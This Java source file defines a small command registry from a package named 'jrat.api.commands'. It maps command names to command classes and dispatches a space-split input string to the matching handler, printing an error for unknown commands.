package jrat.api.commands;

import java.io.PrintStream;
import java.util.HashMap;
import java.util.Map;

public class Commands {

	/**
	 * Global list of commands
	 */
	public static final Map<String, Class<? extends AbstractCommand>> COMMANDS = new HashMap<String, Class<? extends AbstractCommand>>();

	/**
	 * Execute command
	 * 
	 * @param command
	 * @param printer
	 */
	public static synchronized void execute(String command, PrintStream printer) {
		try {
			String[] args = command.split(" ");
			String[] argsNoCmd = new String[args.length - 1];

			for (int i = 1; i < args.length; i++) {
				argsNoCmd[i - 1] = args[i];
			}

			if (COMMANDS.containsKey(args[0].toLowerCase())) {
				AbstractCommand acommand = COMMANDS.get(args[0].toLowerCase()).newInstance();

				acommand.process(argsNoCmd, printer);
			} else {
				System.err.println(args[0] + ": command not found");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
